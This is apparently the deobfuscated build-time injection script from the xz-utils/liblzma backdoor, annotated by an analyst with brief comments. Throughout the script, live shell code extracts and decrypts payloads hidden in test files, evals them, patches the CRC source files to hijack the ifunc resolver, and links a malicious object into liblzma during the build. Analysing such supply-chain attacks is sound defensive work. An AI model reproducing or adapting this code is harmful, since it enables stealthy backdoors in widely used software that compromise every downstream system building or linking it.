# Maybe more future stuff? This grep doesn't seem to find anything at the moment
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
	f1=`echo $vs | cut -d: -f1`
	if test "x$f1" != "x" > /dev/null 2>&1;then
		    start=`expr $(echo $vs | cut -d: -f2) + 7`
		    ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
		    if test "x$ve" != "x" > /dev/null 2>&1;then
			f2=`echo $ve | cut -d: -f1`
			if test "x$f2" != "x" > /dev/null 2>&1;then
			    [ ! "x$f2" = "x$f1" ] && exit 0
			    [ ! -f $f1 ] && exit 0
			    end=`expr $(echo $ve | cut -d: -f2) - $start`
			    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
			fi
		    fi
	fi
fi
eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi
N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi
# This section and onwards feels like the main backdoor logic
# shfmt-ignore
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
# Replace _ -> -
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
# Replace _ -> -
cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
    sed "/include \"crc32_arm64.h\"/a \\$V" | \
    sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
    # This probably builds the backdoor after all the sed commands make edits to the source code
    $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
    eval $RgYB
    if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
	if test ! -f .libs/liblzma.so; then
	    # Undo the previous conversion from underscore to dash
	    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
	    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
	fi
	rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
    else
	# Undo the previous conversion from underscore to dash
	mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
	mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
    fi
    rm -f .libs/liblzma_la-crc32-fast.o || true
    rm -f .libs/liblzma_la-crc64-fast.o || true
else
    # Undo the previous conversion from underscore to dash
    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
else
# Undo the previous conversion from underscore to dash
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
rm -f liblzma_la-crc64-fast.o || true

